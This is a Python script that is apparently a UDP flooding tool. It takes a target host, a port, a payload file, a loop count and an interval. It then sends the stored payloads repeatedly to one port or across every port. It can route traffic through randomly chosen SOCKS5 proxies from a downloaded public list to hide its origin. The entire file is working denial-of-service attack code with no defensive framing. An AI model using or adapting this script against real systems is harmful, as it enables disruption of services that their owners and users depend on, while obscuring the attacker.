import marshal
import random
import socket
import sys
import time
import os

try:
    import socks
    import wget
except:
    print("Import module error! Please run \"pip install -r requirements.txt\"")
    os._exit(1)

def getTime():
    return time.strftime('%H:%M:%S')

def getProxy() -> list:
    if not os.path.exists(r"socks5.txt"):
        print(f"[{getTime()}] Downloading proxy list...")
        wget.download("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt")
        print(f"")
        print(f"[{getTime()}] Proxy list downloaded!")

    with open("socks5.txt", "r") as file:
        socksList = file.readlines()
        randomIndex = random.randint(0, len(socksList) - 1)
        proxy = socksList[randomIndex]
        proxyIP, proxyPort = proxy.rsplit(':', 1)
        #print(proxyIP, ":", proxyPort)
        return proxyIP, int(proxyPort)

def getOptions():
    try:
        target = sys.argv[1]
        port = sys.argv[2]
        file = sys.argv[3]
        loops = sys.argv[4]
        interval = sys.argv[5]
        proxyUsed = sys.argv[6]
        isDisplayMotd = sys.argv[7]
    except:
        target = input("Target(IP/Domain): ")
        port = input("Port(Number): ")
        file = input("File(Path): ")
        loops = input("Loops(Number): ")
        interval = input("Interval(sec): ")
        proxyUsed = input("Proxy(y/n): ")
        isDisplayMotd = input("Display Motd(y/n): ")
    if proxyUsed == "y":
        print(f"[{getTime()}] Proxy mode is under development and deprecated!")
        proxyUsed = True
    else:
        proxyUsed = False

    if isDisplayMotd == "y":
        isDisplayMotd = True
    else:
        isDisplayMotd = False
    print()
    return target, int(port), file, int(loops), float(interval), proxyUsed, isDisplayMotd

target, port, file, loops, interval, proxyUsed, isDisplayMotd = getOptions()

def createSocket():
    localPort = random.randint(1024, 65535)
    localHostIP = socket.gethostbyname(socket.gethostname())
    proxyIP, proxyPort = None, None
    if proxyUsed:
        socketSend = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
        proxyIP, proxyPort = getProxy()
        socketSend.set_proxy(socks.SOCKS5, proxyIP, proxyPort)
        if proxyUsed:
            print(f"[{getTime()}] Used proxy: {proxyIP}:{proxyPort}")
    else:
        socketSend = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        socketSend.bind((str(localHostIP), localPort))
    return localPort, socketSend

def sendPacket(target, port, file, loops, interval):
    for i in range(loops):
        localPort, socketSend = createSocket()
        payloads = None
        try:
            payloads = marshal.load(open(file, "rb"))
        except:
            print(f"[{getTime()}] Payload file not found!")
            sys.exit()
        try:
            if isDisplayMotd:
                __import__("motd").sendPacket(target, port)
        except:
            if isDisplayMotd:
                print(f"[{getTime()}] Target server offline.")
        #print(f"[{getTime()}] Sending packet...")
        try:
            if port == "*":
                for port in range(65535):
                    for line in payloads:
                        socketSend.sendto(line, (target, port))
            else:
                for line in payloads:
                    socketSend.sendto(line, (target, int(port)))
            print(f"[{getTime()}] Loop ", str(i)," done, used local port: ", str(localPort), "\n")
        except:
            print(f"[{getTime()}] Loop ", str(i)," error! Skip...", "\n")
            pass
        if i+1 < loops:
            time.sleep(interval)

if __name__ == "__main__":
    sendPacket(target, port, file, loops, interval)